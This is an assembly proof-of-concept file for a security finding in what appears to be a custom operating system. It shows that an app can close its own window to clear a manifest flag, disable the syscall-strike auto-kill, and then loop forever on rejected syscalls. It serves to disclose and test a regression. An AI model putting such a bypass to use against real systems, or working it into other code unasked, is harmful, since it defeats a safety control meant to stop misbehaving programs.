; ============================================================================
; poc_strike_immunity.inc - PoC for the strike-immunity-via-self-close finding.
;   docs/security/finding-strike-immunity-via-self-close.md
;
; Demonstrates that an app can permanently disable its own §12 syscall-strike
; auto-kill by closing its own primary window (which clears window[slot].
; WF_MANIFEST_OK, the flag the NEW sc_record_strike gates strike counting on)
; while the slot stays live (l3_release_slot skips the wipe under an active
; syscall).
;
; Build as an ordinary app blob and launch in any slot N. Window id == slot id
; for app windows, so the app closes window N (its own).
;
; EXPECTED:
;   * pre-patch (or with the fix): the deny loop hits SC_STRIKE_LIMIT (16) and
;     the slot is torn down; a CAP_AUDIT_STRIKE record is appended.
;   * post-patch (this branch): the deny loop runs unbounded, no strike is ever
;     counted, the slot is never killed.
; ============================================================================
%include "syscall_user.inc"

poc_strike_immunity_main:
    ; --- step 1: close our own primary window (window id == our slot id) -----
    ; SYS_WM_GET_SELF-style helpers vary; for the PoC the launcher passes our
    ; slot id in rdi at entry. Stash it, then close that window.
    mov     r12, rdi                 ; r12 = our slot/window id

    SYS_WM_CLOSE r12                  ; clears window[slot].WF_MANIFEST_OK,
                                      ; resets caps to CAP_CORE, slot stays live

.probe_forever:
    ; --- step 2: issue a CAP_CORE syscall guaranteed to take a *security*
    ; reject (bad user pointer -> sc_validate_from_table fail -> sc_record_strike).
    ; Post-patch every iteration's strike is silently ignored; the slot is never
    ; killed, so this loop runs forever. Pre-patch the slot dies on iteration 16.
    SYS_SYSINFO 0xFFFFFFFFDEAD0000    ; out-of-slot pointer -> validate reject
    jmp     .probe_forever
